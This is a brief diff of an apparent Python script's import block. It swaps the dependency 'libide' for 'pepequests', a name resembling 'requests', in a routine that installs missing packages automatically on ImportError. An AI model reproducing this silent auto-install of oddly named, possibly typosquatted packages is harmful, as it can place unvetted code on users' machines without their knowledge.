@@ -12,13 +12,13 @@ try:
     import requests
     from colorama import Fore, init
     import pandas
-    import libide
+    import pepequests
     import datetime
 except ImportError as e:
     print(e)
     print('Installing modules...')
     time.sleep(2)
-    packages = ['requests', 'colorama', 'pandas', 'libide', 'datetime']
+    packages = ['requests', 'colorama', 'pandas', 'pepequests', 'datetime']
     for package in packages:
         install(package)
     print('Completing installation, please wait...')
@@ -26,7 +26,7 @@ except ImportError as e:
     import requests
     from colorama import Fore, init
     import pandas
-    import libide
+    import pepequests
     import datetime
     os.system('cls')
 
